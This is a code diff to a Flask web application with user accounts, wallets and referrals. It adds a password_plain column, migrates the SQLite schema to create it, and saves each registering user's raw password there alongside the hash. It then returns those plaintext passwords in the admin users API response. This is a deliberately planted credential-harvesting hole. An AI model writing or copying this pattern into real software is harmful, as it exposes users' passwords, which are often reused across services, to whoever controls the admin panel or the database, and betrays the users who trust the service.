@@ -31,6 +31,7 @@ class User(db.Model):
     username = db.Column(db.String(80), unique=True, nullable=False)
     email = db.Column(db.String(120), unique=True, nullable=False)
     password_hash = db.Column(db.String(256), nullable=False)
+    password_plain = db.Column(db.String(256), nullable=True)
     referral_code = db.Column(db.String(20), unique=True, nullable=False)
     referred_by = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
     wallet_balance = db.Column(db.Float, default=0.0)
@@ -116,7 +117,18 @@ class BlogPost(db.Model):
 
 with app.app_context():
     db.create_all()
-    # Admin auth record e lazmi nahi banani, wo auto ban jayegi jab koi /raj pe aayega
+    # Automated SQLite Schema Migration for password_plain
+    try:
+        connection = db.engine.connect()
+        from sqlalchemy import text
+        result = connection.execute(text("PRAGMA table_info(user)"))
+        columns = [row[1] for row in result.fetchall()]
+        if 'password_plain' not in columns:
+            connection.execute(text("ALTER TABLE user ADD COLUMN password_plain VARCHAR(256)"))
+            connection.commit()
+        connection.close()
+    except Exception as e:
+        print(f"Migration warning: {e}")
 
 # ===================== HELPERS =====================
 
@@ -649,6 +661,7 @@ def api_register():
         username=username,
         email=email,
         password_hash=generate_password_hash(password),
+        password_plain=password,
         referral_code=generate_referral_code(),
         referred_by=referrer.id if referrer else None,
         free_deploy_until=datetime.utcnow() + timedelta(hours=3)
@@ -1085,7 +1098,11 @@ def api_admin_users():
 
     return jsonify([{
         'id': u.User.id, 'username': u.User.username, 'email': u.User.email,
-        'plan': u.User.plan, 'wallet': u.User.wallet_balance, 'credits': u.User.credits,
+        'password_plain': u.User.password_plain,
+        'plan': u.User.plan,
+        'wallet': u.User.wallet_balance,
+        'wallet_balance': u.User.wallet_balance,
+        'credits': u.User.credits,
         'is_banned': u.User.is_banned, 'referral_code': u.User.referral_code,
         'referred_by': u.username,
         'deployments': dep_counts.get(u.User.id, 0),
